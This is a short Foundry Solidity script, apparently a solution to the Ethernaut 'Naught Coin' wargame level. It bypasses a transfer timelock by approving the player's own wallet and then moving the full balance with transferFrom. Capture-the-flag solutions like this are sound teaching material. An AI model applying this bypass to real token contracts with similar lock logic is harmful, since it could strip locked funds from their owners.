// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface INaughtCoin {
    function balanceOf(address _owner) external view returns (uint256);

    function approve(address _spender, uint256 _value) external returns (bool);

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool);
}

contract PoC is Script {
    INaughtCoin level15 =
        INaughtCoin(0x3212D0421E355a28150991E610d0e01fa7b7Cf66);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        address myWallet = 0xEAce4b71CA1A128e8B562561f46896D55B9B0246;
        uint myBal = level15.balanceOf(myWallet);
        console2.log("Current balance is: ", myBal);

        level15.approve(myWallet, myBal);
        level15.transferFrom(myWallet, address(level15), myBal);

        console2.log("New balance is: ", level15.balanceOf(myWallet));
        vm.stopBroadcast();
    }
}
